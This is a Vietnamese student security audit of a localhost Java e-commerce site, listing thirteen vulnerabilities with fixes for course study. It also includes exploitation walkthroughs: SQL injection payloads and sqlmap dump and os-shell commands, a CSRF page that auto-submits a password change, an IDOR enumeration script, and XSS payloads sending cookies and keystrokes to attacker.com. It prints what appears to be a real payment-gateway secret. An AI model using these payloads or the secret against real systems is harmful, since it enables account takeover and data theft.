# BÁO CÁO BẢO MẬT HỆ THỐNG WEB - PROJECT CUỐI KỲ MÔN BẢO MẬT WEB

## THÔNG TIN CHUNG

**Tên đề tài**: Bảo mật hệ thống Website bán điện thoại (ElectroMart)  
**Nhóm thực hiện**: [Tên nhóm]  
**Thành viên**:
- [Họ tên 1] - [MSSV] - [Phân công công việc]
- [Họ tên 2] - [MSSV] - [Phân công công việc]  
- [Họ tên 3] - [MSSV] - [Phân công công việc]

**Ngày thực hiện**: 22/03/2026  
**Phiên bản**: 1.0  
**Mức độ rủi ro tổng thể**: 🔴 **NGHIÊM TRỌNG**

---

## MỤC LỤC

1. [Giới thiệu đề tài](#1-giới-thiệu-đề-tài)
2. [Lược đồ Use Case](#2-lược-đồ-use-case)
3. [Lược đồ ERD](#3-lược-đồ-erd)
4. [Kiến trúc hệ thống](#4-kiến-trúc-hệ-thống)
5. [Phương pháp tấn công](#5-phương-pháp-tấn-công)
6. [Kết quả phân tích lỗ hổng](#6-kết-quả-phân-tích-lỗ-hổng)
7. [Hướng dẫn khai thác từng lỗ hổng](#7-hướng-dẫn-khai-thác-từng-lỗ-hổng)
8. [Biện pháp khắc phục](#8-biện-pháp-khắc-phục)
9. [Kết luận và khuyến nghị](#9-kết-luận-và-khuyến-nghị)

---

## 1. GIỚI THIỆU ĐỀ TÀI

### 1.1 Mô tả hệ thống
**ElectroMart** là hệ thống thương mại điện tử chuyên bán các sản phẩm điện tử như điện thoại, laptop, TV, tủ lạnh, máy giặt. Hệ thống được xây dựng bằng Java với kiến trúc MVC sử dụng Jakarta EE 10.

### 1.2 Công nghệ sử dụng
- **Backend**: Java 11, Jakarta EE 10, Jakarta Servlet 6.0
- **ORM**: JPA 3.1 với EclipseLink 4.0.2  
- **Database**: PostgreSQL 14+
- **Frontend**: JSP, JSTL 3.0, HTML5, CSS3, JavaScript
- **Build Tool**: Maven 3.8+
- **Server**: Apache Tomcat 10+

### 1.3 Chức năng chính
- Quản lý người dùng (đăng ký, đăng nhập, phân quyền)
- Quản lý sản phẩm (CRUD, tìm kiếm, lọc)
- Giỏ hàng và thanh toán (COD, VNPay, MoMo)
- Quản lý đơn hàng và theo dõi trạng thái
- Admin panel (dashboard, báo cáo, quản lý)
- Hệ thống khuyến mãi và phiếu giảm giá

---

## 2. LƯỢC ĐỒ USE CASE

```
                    Hệ thống ElectroMart
    
    Khách hàng                     Admin                    Nhân viên
        |                           |                         |
        |-- Đăng ký/Đăng nhập      |-- Quản lý sản phẩm     |-- Xử lý đơn hàng
        |-- Xem sản phẩm           |-- Quản lý đơn hàng     |-- Hỗ trợ khách hàng
        |-- Tìm kiếm sản phẩm      |-- Quản lý người dùng   |-- Cập nhật kho
        |-- Thêm vào giỏ hàng      |-- Xem báo cáo          |
        |-- Thanh toán             |-- Quản lý khuyến mãi   |
        |-- Theo dõi đơn hàng      |-- Cấu hình hệ thống    |
        |-- Đánh giá sản phẩm      |                         |
        |-- Quên mật khẩu          |                         |
```

---

## 3. LƯỢC ĐỒ ERD

```
    [nguoi_dung] ----< [dia_chi]
         |
         |-- [khach_hang] ----< [gio_hang] ----< [don_hang] ----< [chi_tiet_don_hang] >---- [san_pham]
         |                                           |                                           |
         |-- [admin]                                 |                                           |
         |                                           |                                           |
         |-- [nhan_vien]                            |                                           |
                                                     |                                           |
                                              [phieu_thanh_toan]                               |
                                                     |                                           |
                                              [phuong_thuc_tt]                                 |
                                                                                               |
    [phieu_giam_gia] ----< [phieu_giam_gia_san_pham] >----                                   |
         |                                                                                     |
         |-- [phieu_giam_gia_loai] >---- [loai_san_pham] <---- [san_pham] >---- [thuong_hieu]
                                                                     |
                                                              [chi_tiet_phieu_nhap] >---- [phieu_nhap]
                                                                     |
                                                              [chi_tiet_phieu_xuat] >---- [phieu_xuat]
```

---

## 4. KIẾN TRÚC HỆ THỐNG

### 4.1 Kiến trúc MVC
```
    [Browser] <---> [Controller (Servlet)] <---> [Model (JPA Entity)] <---> [Database]
                            |
                            v
                    [View (JSP)]
```

### 4.2 Cấu trúc package
- `com.demo.controller`: 29 servlet controllers
- `com.demo.model`: JPA entities với inheritance
- `com.demo.persistence`: Generic DAO pattern
- `com.demo.enums`: Enum types
- `com.electromart.filter`: Security filters

### 4.3 Luồng xử lý request
1. Request → Filter (encoding, authentication)
2. Filter → Servlet Controller
3. Controller → DAO → Database
4. Database → DAO → Controller
5. Controller → JSP View → Response

---

## 5. PHƯƠNG PHÁP TẤN CÔNG

### 5.1 Manual Testing (Tấn công thủ công)
Sử dụng các kỹ thuật tấn công web đã học:
- **SQL Injection**: Thử inject SQL commands vào input fields
- **Cross-Site Scripting (XSS)**: Inject JavaScript code
- **Cross-Site Request Forgery (CSRF)**: Tạo request giả mạo
- **Authentication Bypass**: Thử bypass cơ chế xác thực
- **Session Management**: Tấn công session và cookies
- **Input Validation**: Test với dữ liệu bất thường
- **Authorization**: Thử truy cập tài nguyên không được phép

### 5.2 Automated Tools (Công cụ tự động)
- **OWASP ZAP**: Web application security scanner
- **SQLMap**: Automated SQL injection tool
- **Burp Suite**: Web vulnerability scanner
- **Nikto**: Web server scanner
- **Nmap**: Network discovery và security auditing

### 5.3 Quy trình thực hiện
1. **Reconnaissance**: Thu thập thông tin về hệ thống
2. **Scanning**: Quét tìm lỗ hổng bằng tools
3. **Enumeration**: Liệt kê chi tiết các lỗ hổng
4. **Exploitation**: Khai thác lỗ hổng thực tế
5. **Post-exploitation**: Đánh giá tác động
6. **Reporting**: Báo cáo và đề xuất khắc phục

---

## 🔴 LỖ HỔNG NGHIÊM TRỌNG (CRITICAL)

### 1. Lưu Trữ Mật Khẩu Dạng Plaintext
**Mức độ**: 🔴 Critical  
**CVSS Score**: 9.8  

**Mô tả**: Hệ thống lưu trữ mật khẩu người dùng và admin dưới dạng plaintext trong database.

**Vị trí lỗ hổng**:
```java
// RegisterServlet.java - line 52
kh.setMatKhau(pass); // Lưu plaintext

// AdminLoginServlet.java - line 18
private static final String DEFAULT_PASS = "P@ssw0rd";
a.setMatKhau(DEFAULT_PASS); // plaintext password

// AdminDAO.java - line 47
a.setMatKhau("P@ssw0rd"); // DEV: plaintext
```

**Tác động**:
- Nếu database bị tấn công, tất cả mật khẩu sẽ bị lộ
- Nhân viên có quyền truy cập database có thể xem mật khẩu
- Vi phạm quy định bảo mật dữ liệu cá nhân

**Khắc phục**:
```java
// Sử dụng BCrypt để hash password
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hashedPassword = encoder.encode(plainPassword);
kh.setMatKhau(hashedPassword);

// Verify password
boolean matches = encoder.matches(plainPassword, hashedPassword);
```

---

### 2. Xác Thực Yếu (Weak Authentication)
**Mức độ**: 🔴 Critical  
**CVSS Score**: 8.5  

**Mô tả**: Hệ thống xác thực có nhiều điểm yếu nghiêm trọng.

**Vị trí lỗ hổng**:
```java
// LoginServlet.java - line 37
if (aOpt.isPresent() && password.equals(aOpt.get().getMatKhau())) {
    // Direct plaintext comparison
}
```

**Các vấn đề**:
- So sánh mật khẩu trực tiếp không hash
- Không có rate limiting (có thể brute force)
- Không có account lockout sau nhiều lần đăng nhập sai
- Không có captcha để chống bot

**Khắc phục**:
```java
// Implement rate limiting
@Component
public class LoginAttemptService {
    private final Map<String, Integer> attemptsCache = new ConcurrentHashMap<>();
    
    public void loginFailed(String key) {
        int attempts = attemptsCache.getOrDefault(key, 0);
        attemptsCache.put(key, attempts + 1);
    }
    
    public boolean isBlocked(String key) {
        return attemptsCache.getOrDefault(key, 0) >= 3;
    }
}
```

---

### 3. SQL Injection Tiềm Ẩn
**Mức độ**: 🔴 Critical  
**CVSS Score**: 9.0  

**Mô tả**: Một số query có thể bị SQL injection do nối chuỗi trực tiếp.

**Vị trí lỗ hổng**:
```java
// GenericDAO.java - line 45
String order = (orderBy==null||orderBy.isBlank()) ? "" :
    " order by " + alias + "." + orderBy + (asc ? " asc" : " desc");
```

**Exploit ví dụ**:
```
GET /search?sort=price_asc&orderBy=gia; DROP TABLE san_pham; --
```

**Khắc phục**:
```java
// Whitelist allowed sort columns
private static final Set<String> ALLOWED_SORT_COLUMNS = 
    Set.of("id", "tenSanPham", "gia", "ngayTao");

public Page<T> findAll(int page, int size, String orderBy, boolean asc) {
    if (orderBy != null && !ALLOWED_SORT_COLUMNS.contains(orderBy)) {
        throw new IllegalArgumentException("Invalid sort column");
    }
    // ... rest of method
}
```

---

### 4. Session Fixation
**Mức độ**: 🔴 Critical  
**CVSS Score**: 7.5  

**Mô tả**: Hệ thống không regenerate session ID sau khi đăng nhập thành công.

**Vị trí lỗ hổng**:
```java
// LoginServlet.java - line 43
HttpSession ss = req.getSession(true);
ss.setAttribute("IS_ADMIN", true);
// Không regenerate session ID
```

**Khắc phục**:
```java
// Regenerate session ID after successful login
HttpSession oldSession = req.getSession(false);
if (oldSession != null) {
    oldSession.invalidate();
}
HttpSession newSession = req.getSession(true);
newSession.setAttribute("user", sessionUser);
```

---

### 5. Hardcoded Credentials
**Mức độ**: 🔴 Critical  
**CVSS Score**: 8.0  

**Mô tả**: Thông tin xác thực nhạy cảm được hardcode trong source code.

**Vị trí lỗ hổng**:
```java
// VNPayConfig.java
public static String vnp_TmnCode = "K1SH6864";
public static String vnp_HashSecret = "1J64G1DKLNTS3B30FSYO6XSPMW6QBE7E";

// persistence.xml
<property name="jakarta.persistence.jdbc.password" value="[REDACTED_AIVEN_PASSWORD]"/>
```

**Khắc phục**:
```java
// Sử dụng environment variables
public class VNPayConfig {
    public static String vnp_TmnCode = System.getenv("VNPAY_TMN_CODE");
    public static String vnp_HashSecret = System.getenv("VNPAY_HASH_SECRET");
}
```

---

## 🟠 LỖ HỔNG MỨC ĐỘ CAO (HIGH)

### 6. Thiếu CSRF Protection
**Mức độ**: 🟠 High  
**CVSS Score**: 6.5  

**Mô tả**: Tất cả các form không có CSRF token protection.

**Tác động**:
- Attacker có thể thực hiện các hành động thay mặt user
- Có thể thay đổi thông tin profile, đặt hàng, xóa sản phẩm

**Khắc phục**:
```java
// CSRFFilter.java
@WebFilter("/*")
public class CSRFFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        
        if ("POST".equals(req.getMethod())) {
            String sessionToken = (String) req.getSession().getAttribute("csrf_token");
            String requestToken = req.getParameter("csrf_token");
            
            if (!Objects.equals(sessionToken, requestToken)) {
                throw new ServletException("CSRF token mismatch");
            }
        }
        chain.doFilter(request, response);
    }
}
```

---

### 7. Insecure Direct Object Reference (IDOR)
**Mức độ**: 🟠 High  
**CVSS Score**: 7.0  

**Mô tả**: Người dùng có thể truy cập tài nguyên của người khác bằng cách thay đổi ID.

**Ví dụ exploit**:
```
GET /orders?id=123  // User A's order
GET /orders?id=124  // User B's order - accessible by User A
```

**Khắc phục**:
```java
// OrdersServlet.java
public void doGet(HttpServletRequest req, HttpServletResponse resp) {
    Long orderId = Long.parseLong(req.getParameter("id"));
    SessionUser user = (SessionUser) req.getSession().getAttribute("user");
    
    DonHang order = donHangDAO.findById(orderId);
    if (order == null || !order.getKhachHangId().equals(user.getId())) {
        resp.sendError(HttpServletResponse.SC_FORBIDDEN);
        return;
    }
    // Process order
}
```

---

### 8. Weak Authorization
**Mức độ**: 🟠 High  
**CVSS Score**: 6.8  

**Mô tả**: Authorization chỉ dựa vào session attribute có thể bị bypass.

**Vị trí lỗ hổng**:
```java
// AdminAuthFilter.java
Boolean isAdmin = (Boolean) req.getSession().getAttribute("IS_ADMIN");
if (Boolean.TRUE.equals(isAdmin)) {
    chain.doFilter(request, response);
}
```

**Khắc phục**:
```java
// Implement proper role-based authorization
@WebFilter("/admin/*")
public class AdminAuthFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        SessionUser user = (SessionUser) req.getSession().getAttribute("user");
        
        if (user == null || !user.isAdmin()) {
            resp.sendRedirect("/login");
            return;
        }
        
        // Verify admin role from database
        Admin admin = adminDAO.findById(user.getId());
        if (admin == null) {
            resp.sendError(HttpServletResponse.SC_FORBIDDEN);
            return;
        }
        
        chain.doFilter(request, response);
    }
}
```

---

### 9. Input Validation Yếu
**Mức độ**: 🟠 High  
**CVSS Score**: 6.0  

**Mô tả**: Validation input không đầy đủ và có thể bypass.

**Vị trí lỗ hổng**:
```java
// RegisterServlet.java - line 39
if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
    // Regex quá đơn giản
}
```

**Khắc phục**:
```java
// Sử dụng Apache Commons Validator
import org.apache.commons.validator.routines.EmailValidator;

public boolean isValidEmail(String email) {
    EmailValidator validator = EmailValidator.getInstance();
    return validator.isValid(email);
}

// Input sanitization
public String sanitizeInput(String input) {
    if (input == null) return "";
    return input.trim()
                .replaceAll("[<>\"'&]", "")
                .substring(0, Math.min(input.length(), 255));
}
```

---

### 10. Password Reset Không An Toàn
**Mức độ**: 🟠 High  
**CVSS Score**: 6.5  

**Mô tả**: Cơ chế reset password có nhiều lỗ hổng.

**Vị trí lỗ hổng**:
```java
// ForgotPasswordServlet.java - line 16
private static final ConcurrentHashMap<String, String> resetTokens = new ConcurrentHashMap<>();
```

**Vấn đề**:
- Token lưu trong memory (mất khi restart server)
- Không có expiration time
- Không có rate limiting
- Token có thể đoán được

**Khắc phục**:
```java
// Lưu token trong database với expiration
@Entity
public class PasswordResetToken {
    private String token;
    private Long userId;
    private LocalDateTime expiryDate;
    private boolean used;
    
    public boolean isExpired() {
        return LocalDateTime.now().isAfter(expiryDate);
    }
}

// Generate secure token
public String generateSecureToken() {
    SecureRandom random = new SecureRandom();
    byte[] bytes = new byte[32];
    random.nextBytes(bytes);
    return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
}
```

---

## 🟡 LỖ HỔNG MỨC ĐỘ TRUNG BÌNH (MEDIUM)

### 11. Missing Security Headers
**Mức độ**: 🟡 Medium  
**CVSS Score**: 4.5  

**Mô tả**: Thiếu các security headers quan trọng.

**Headers bị thiếu**:
- Content-Security-Policy
- X-Frame-Options  
- X-Content-Type-Options
- Strict-Transport-Security

**Khắc phục**:
```xml
<!-- web.xml -->
<filter>
    <filter-name>SecurityHeadersFilter</filter-name>
    <filter-class>com.demo.filter.SecurityHeadersFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>SecurityHeadersFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

```java
// SecurityHeadersFilter.java
public void doFilter(ServletRequest request, ServletResponse response, 
                    FilterChain chain) throws IOException, ServletException {
    HttpServletResponse resp = (HttpServletResponse) response;
    
    resp.setHeader("X-Frame-Options", "DENY");
    resp.setHeader("X-Content-Type-Options", "nosniff");
    resp.setHeader("X-XSS-Protection", "1; mode=block");
    resp.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    resp.setHeader("Content-Security-Policy", 
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");
    
    chain.doFilter(request, response);
}
```

---

### 12. Session Management Yếu
**Mức độ**: 🟡 Medium  
**CVSS Score**: 5.0  

**Mô tả**: Quản lý session không an toàn.

**Vấn đề**:
- Không có session timeout
- Không set secure flags cho cookies
- Session data không persistent

**Khắc phục**:
```xml
<!-- web.xml -->
<session-config>
    <session-timeout>30</session-timeout>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
        <same-site>Strict</same-site>
    </cookie-config>
</session-config>
```

---

### 13. Sensitive Data Exposure
**Mức độ**: 🟡 Medium  
**CVSS Score**: 4.8  

**Mô tả**: Thông tin nhạy cảm bị expose trong logs và responses.

**Vị trí**:
```java
// Debug statements expose sensitive info
System.out.println("🛒 [DEBUG] Giỏ hàng đã được tải từ DB cho khách ID " + k.getId());
```

**Khắc phục**:
- Remove debug statements trong production
- Implement proper logging framework
- Mask sensitive data trong logs

---

## 🔧 LỖ HỔNG CÓ THỂ TẠO THÊM

### 1. Cross-Site Scripting (XSS)
**Điều kiện**: Nếu JSP không escape user input

**Exploit**:
```html
<!-- search.jsp -->
<input type="text" value="<%= request.getParameter("keyword") %>" />
<!-- Có thể inject: "><script>alert('XSS')</script> -->
```

**Khắc phục**:
```jsp
<!-- Sử dụng JSTL để escape -->
<input type="text" value="<c:out value='${param.keyword}' />" />
```

---

### 2. Path Traversal
**Điều kiện**: Nếu có file upload không validate

**Exploit**:
```java
String filename = req.getParameter("filename");
// Có thể upload: ../../../etc/passwd
```

**Khắc phục**:
```java
public boolean isValidFilename(String filename) {
    return filename != null && 
           !filename.contains("..") && 
           !filename.contains("/") && 
           !filename.contains("\\");
}
```

---

### 3. XML External Entity (XXE)
**Điều kiện**: Nếu parse XML user input

**Khắc phục**:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

## 📊 THỐNG KÊ LỖ HỔNG

| Mức độ | Số lượng | Tỷ lệ |
|--------|----------|-------|
| 🔴 Critical | 5 | 38.5% |
| 🟠 High | 5 | 38.5% |
| 🟡 Medium | 3 | 23.0% |
| **Tổng** | **13** | **100%** |

---

## 🎯 KHUYẾN NGHỊ ƯU TIÊN

### Giai đoạn 1 (Khẩn cấp - 1-2 tuần)
1. ✅ **Hash tất cả passwords** với BCrypt
2. ✅ **Implement CSRF protection**
3. ✅ **Fix SQL injection** trong GenericDAO
4. ✅ **Regenerate session IDs** sau login
5. ✅ **Externalize credentials**

### Giai đoạn 2 (Cao - 2-4 tuần)  
6. ✅ **Add proper authorization checks**
7. ✅ **Implement rate limiting**
8. ✅ **Secure password reset mechanism**
9. ✅ **Add input validation framework**
10. ✅ **Fix IDOR vulnerabilities**

### Giai đoạn 3 (Trung bình - 1-2 tháng)
11. ✅ **Add security headers**
12. ✅ **Secure session management**
13. ✅ **Implement proper logging**
14. ✅ **Security testing & code review**

---

## 🛡️ BIỆN PHÁP PHÒNG NGỪA

### 1. Secure Development Lifecycle
- Code review bắt buộc cho mọi thay đổi
- Static code analysis tools (SonarQube, Checkmarx)
- Dependency vulnerability scanning

### 2. Security Testing
- Penetration testing định kỳ
- Automated security testing trong CI/CD
- Bug bounty program

### 3. Monitoring & Logging
- Security event monitoring
- Intrusion detection system
- Log analysis và alerting

### 4. Training
- Security awareness training cho developers
- Secure coding guidelines
- Regular security updates

---

## 📞 LIÊN HỆ

**Security Team**: security@electromart.com  
**Emergency**: +84-xxx-xxx-xxx  
**Report Date**: 16/03/2026  
**Next Review**: 16/06/2026

---

*Báo cáo này chứa thông tin nhạy cảm và chỉ dành cho nội bộ. Vui lòng không chia sẻ ra bên ngoài.*
---

## 6. KẾT QUẢ PHÂN TÍCH LỖ HỔNG

### 6.1 Thống kê tổng quan

| Mức độ | Số lượng | Tỷ lệ | Mô tả |
|--------|----------|-------|-------|
| 🔴 Critical | 5 | 38.5% | Lỗ hổng nghiêm trọng, cần khắc phục ngay |
| 🟠 High | 5 | 38.5% | Lỗ hổng mức độ cao, ưu tiên khắc phục |
| 🟡 Medium | 3 | 23.0% | Lỗ hổng trung bình, khắc phục trong kế hoạch |
| **Tổng** | **13** | **100%** | **Tổng số lỗ hổng phát hiện** |

### 6.2 Phân loại theo OWASP Top 10

| OWASP Category | Lỗ hổng phát hiện | Mức độ |
|----------------|-------------------|--------|
| A01 - Broken Access Control | IDOR, Weak Authorization | High |
| A02 - Cryptographic Failures | Plaintext Passwords | Critical |
| A03 - Injection | SQL Injection | Critical |
| A04 - Insecure Design | Session Fixation | Critical |
| A05 - Security Misconfiguration | Missing Security Headers | Medium |
| A06 - Vulnerable Components | Hardcoded Credentials | Critical |
| A07 - Authentication Failures | Weak Authentication | Critical |
| A08 - Software Integrity Failures | N/A | - |
| A09 - Security Logging Failures | Sensitive Data Exposure | Medium |
| A10 - Server-Side Request Forgery | N/A | - |

---

## 7. HƯỚNG DẪN KHAI THÁC TỪNG LỖ HỔNG

### 7.1 🔴 LỖ HỔNG CRITICAL #1: Plaintext Password Storage

**Mô tả**: Hệ thống lưu trữ mật khẩu dưới dạng plaintext trong database.

**Vị trí lỗ hổng**:
```java
// RegisterServlet.java - line 52
kh.setMatKhau(pass); // Lưu plaintext

// AdminDAO.java - line 47  
a.setMatKhau("P@ssw0rd"); // DEV: plaintext
```

**Cách khai thác**:

**Bước 1**: Truy cập database (giả sử có quyền)
```sql
-- Xem tất cả mật khẩu khách hàng
SELECT email, mat_khau FROM khach_hang 
JOIN nguoi_dung ON khach_hang.id = nguoi_dung.id;

-- Kết quả:
-- admin@electromart.com | P@ssw0rd
-- user@example.com     | password123
```

**Bước 2**: Sử dụng mật khẩu để đăng nhập
```bash
# Test login với mật khẩu plaintext
curl -X POST http://localhost:8080/login \
  -d "account=admin@electromart.com&password=P@ssw0rd"
```

**Tác động**:
- Nếu database bị breach, tất cả mật khẩu bị lộ
- Nhân viên IT có thể xem mật khẩu người dùng
- Vi phạm quy định bảo vệ dữ liệu cá nhân (GDPR, PDPA)

**Proof of Concept**:
```java
// Tạo tài khoản test
POST /register
Content-Type: application/x-www-form-urlencoded

fullName=Test User&email=test@example.com&password=secret123&confirm=secret123

// Kiểm tra database
SELECT mat_khau FROM khach_hang WHERE email = 'test@example.com';
// Kết quả: secret123 (plaintext)
```

---

### 7.2 🔴 LỖ HỔNG CRITICAL #2: SQL Injection

**Mô tả**: Lỗ hổng SQL injection trong GenericDAO do nối chuỗi trực tiếp.

**Vị trí lỗ hổng**:
```java
// GenericDAO.java - line 45
String order = (orderBy==null||orderBy.isBlank()) ? "" :
    " order by " + alias + "." + orderBy + (asc ? " asc" : " desc");
```

**Cách khai thác**:

**Bước 1**: Tìm endpoint sử dụng sorting
```bash
# Test basic sorting
GET /search?q=phone&sort=price_asc&orderBy=gia
```

**Bước 2**: Inject SQL payload
```bash
# Payload 1: Information disclosure
GET /search?orderBy=gia; SELECT version(); --

# Payload 2: Union-based injection  
GET /search?orderBy=gia UNION SELECT password FROM admin; --

# Payload 3: Time-based blind injection
GET /search?orderBy=gia; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; --
```

**Bước 3**: Khai thác để lấy dữ liệu
```sql
-- Lấy danh sách bảng
orderBy=gia UNION SELECT table_name FROM information_schema.tables; --

-- Lấy cấu trúc bảng
orderBy=gia UNION SELECT column_name FROM information_schema.columns WHERE table_name='khach_hang'; --

-- Lấy dữ liệu nhạy cảm
orderBy=gia UNION SELECT email||':'||mat_khau FROM khach_hang; --
```

**Automated exploitation với SQLMap**:
```bash
# Cài đặt SQLMap
pip install sqlmap

# Test injection
sqlmap -u "http://localhost:8080/search?q=phone&orderBy=gia" \
       --cookie="JSESSIONID=your_session_id" \
       --level=3 --risk=3

# Dump database
sqlmap -u "http://localhost:8080/search?q=phone&orderBy=gia" \
       --dump-all --batch
```

---

### 7.3 🔴 LỖ HỔNG CRITICAL #3: Session Fixation

**Mô tả**: Hệ thống không regenerate session ID sau khi đăng nhập thành công.

**Vị trí lỗ hổng**:
```java
// LoginServlet.java - line 43
HttpSession ss = req.getSession(true);
ss.setAttribute("IS_ADMIN", true);
// Không regenerate session ID
```

**Cách khai thác**:

**Bước 1**: Attacker lấy session ID
```bash
# Tạo session mới
curl -c cookies.txt http://localhost:8080/login

# Lấy JSESSIONID từ cookies.txt
# Ví dụ: JSESSIONID=ABC123DEF456
```

**Bước 2**: Gửi link có session ID cho victim
```html
<!-- Social engineering email -->
<a href="http://localhost:8080/login;jsessionid=ABC123DEF456">
  Đăng nhập để nhận ưu đãi đặc biệt!
</a>
```

**Bước 3**: Victim đăng nhập với session ID của attacker
```bash
# Victim đăng nhập
curl -b "JSESSIONID=ABC123DEF456" \
     -X POST http://localhost:8080/login \
     -d "account=victim@example.com&password=victim_password"
```

**Bước 4**: Attacker sử dụng session để truy cập
```bash
# Attacker có thể truy cập tài khoản victim
curl -b "JSESSIONID=ABC123DEF456" \
     http://localhost:8080/profile
```

---

### 7.4 🟠 LỖ HỔNG HIGH #1: Cross-Site Request Forgery (CSRF)

**Mô tả**: Tất cả các form không có CSRF token protection.

**Cách khai thác**:

**Bước 1**: Tạo malicious website
```html
<!-- evil.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone Giveaway!</title>
</head>
<body>
    <h1>Congratulations! You won a free iPhone!</h1>
    <p>Click the button below to claim your prize:</p>
    
    <!-- Hidden CSRF attack -->
    <form id="csrf-form" action="http://localhost:8080/profile" method="POST" style="display:none;">
        <input name="action" value="changePassword">
        <input name="currentPassword" value="password123">
        <input name="newPassword" value="hacked123">
        <input name="confirmPassword" value="hacked123">
    </form>
    
    <button onclick="document.getElementById('csrf-form').submit();">
        Claim Your iPhone!
    </button>
    
    <!-- Auto-submit version -->
    <script>
        // Tự động submit khi load trang
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 2000);
    </script>
</body>
</html>
```

**Bước 2**: Victim truy cập malicious site khi đã đăng nhập
```bash
# Victim đã đăng nhập ElectroMart
# Sau đó truy cập evil.html
# → Mật khẩu bị thay đổi mà không biết
```

**Bước 3**: Khai thác nâng cao - Thay đổi thông tin admin
```html
<!-- CSRF attack targeting admin -->
<form action="http://localhost:8080/admin/products" method="POST">
    <input name="action" value="delete">
    <input name="id" value="1"> <!-- Xóa sản phẩm ID 1 -->
</form>

<script>
    // Auto-submit when admin visits page
    document.forms[0].submit();
</script>
```

---

### 7.5 🟠 LỖ HỔNG HIGH #2: Insecure Direct Object Reference (IDOR)

**Mô tả**: Người dùng có thể truy cập tài nguyên của người khác bằng cách thay đổi ID.

**Vị trí lỗ hổng**:
```java
// OrdersServlet.java - thiếu kiểm tra ownership
Long orderId = Long.parseLong(req.getParameter("id"));
DonHang order = donHangDAO.findById(orderId);
// Không kiểm tra order.getKhachHangId() == currentUser.getId()
```

**Cách khai thác**:

**Bước 1**: Đăng nhập với tài khoản hợp lệ
```bash
curl -c cookies.txt -X POST http://localhost:8080/login \
     -d "account=user1@example.com&password=password123"
```

**Bước 2**: Xem đơn hàng của chính mình
```bash
curl -b cookies.txt http://localhost:8080/orders?id=100
# Trả về thông tin đơn hàng ID 100 của user1
```

**Bước 3**: Thử truy cập đơn hàng của người khác
```bash
# Thử các ID khác
curl -b cookies.txt http://localhost:8080/orders?id=101
curl -b cookies.txt http://localhost:8080/orders?id=102
curl -b cookies.txt http://localhost:8080/orders?id=99

# Nếu thành công → có thể xem đơn hàng của user khác
```

**Bước 4**: Automated IDOR testing
```python
import requests

session = requests.Session()

# Login
login_data = {
    'account': 'user1@example.com',
    'password': 'password123'
}
session.post('http://localhost:8080/login', data=login_data)

# Test IDOR
for order_id in range(1, 1000):
    response = session.get(f'http://localhost:8080/orders?id={order_id}')
    if response.status_code == 200 and 'Đơn hàng' in response.text:
        print(f"IDOR found: Can access order {order_id}")
```

---

### 7.6 🟡 LỖ HỔNG MEDIUM #1: Cross-Site Scripting (XSS)

**Mô tả**: Nếu JSP không escape user input, có thể bị XSS.

**Cách khai thác**:

**Bước 1**: Test Reflected XSS trong search
```bash
# Test basic XSS payload
GET /search?q=<script>alert('XSS')</script>

# Test if output is reflected without encoding
GET /search?q=<img src=x onerror=alert('XSS')>
```

**Bước 2**: Test Stored XSS trong profile
```bash
# Cập nhật profile với XSS payload
POST /profile
Content-Type: application/x-www-form-urlencoded

action=update&fullName=<script>alert('Stored XSS')</script>&phone=123456789
```

**Bước 3**: Advanced XSS payloads
```javascript
// Cookie stealing
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

// Session hijacking
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: 'session=' + document.cookie
});
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/keylog', {
        method: 'POST',
        body: 'key=' + e.key
    });
});
</script>
```

---

### 7.7 Sử dụng OWASP ZAP để quét tự động

**Bước 1**: Cài đặt OWASP ZAP
```bash
# Download từ https://www.zaproxy.org/download/
# Hoặc sử dụng Docker
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:8080
```

**Bước 2**: Cấu hình ZAP
```bash
# Khởi động ZAP với proxy
zap.sh -daemon -port 8090 -config api.disablekey=true

# Cấu hình browser để sử dụng proxy 127.0.0.1:8090
```

**Bước 3**: Spider và quét
```bash
# Spider website
curl "http://localhost:8090/JSON/spider/action/scan/?url=http://localhost:8080"

# Active scan
curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://localhost:8080"

# Lấy kết quả
curl "http://localhost:8090/JSON/core/view/alerts/"
```

---

### 7.8 Sử dụng SQLMap để test SQL Injection

**Bước 1**: Cài đặt SQLMap
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

**Bước 2**: Test các endpoint
```bash
# Test search endpoint
python sqlmap.py -u "http://localhost:8080/search?q=phone&orderBy=gia" \
                 --cookie="JSESSIONID=your_session" \
                 --level=3 --risk=3 --batch

# Test với POST data
python sqlmap.py -u "http://localhost:8080/login" \
                 --data="account=test&password=test" \
                 --level=3 --risk=3 --batch
```

**Bước 3**: Khai thác nếu tìm thấy injection
```bash
# Dump database schema
python sqlmap.py -u "http://localhost:8080/search?orderBy=gia" \
                 --schema --batch

# Dump specific table
python sqlmap.py -u "http://localhost:8080/search?orderBy=gia" \
                 -D electromart_db -T khach_hang --dump --batch

# Get shell (nếu có quyền)
python sqlmap.py -u "http://localhost:8080/search?orderBy=gia" \
                 --os-shell --batch
```
---

